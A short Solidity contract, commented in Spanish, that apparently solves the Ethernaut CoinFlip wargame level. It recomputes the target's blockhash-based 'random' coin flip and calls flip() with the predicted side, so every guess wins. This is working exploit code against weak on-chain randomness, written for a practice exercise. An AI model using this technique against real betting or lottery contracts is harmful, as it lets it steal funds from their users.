// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface coinfliper {
    function flip(bool _guess) external returns (bool);
}

// Este contrato copia al que deseamos hackear para saber cual sera el resultado y le enviamos eso al
// contrato de ethernaut y por lo tanto sabremos que vamos a ganar de antemano
contract CoinFlip {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  coinfliper public myContract;
  address myContract2;

  constructor(address _addr) {
    myContract= coinfliper(_addr);
    myContract2= _addr;
  }

  function flip2() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false; // calcula el side de la misma forma que el contrato a hackear
    myContract.flip(side); // llamo al contrato a hackear con el side que calculé previamente
  }

    // para cambiar la instancia del contrato a hackear
  function changeContractToHack(address _addr) public {
    myContract= coinfliper(_addr);
  }

}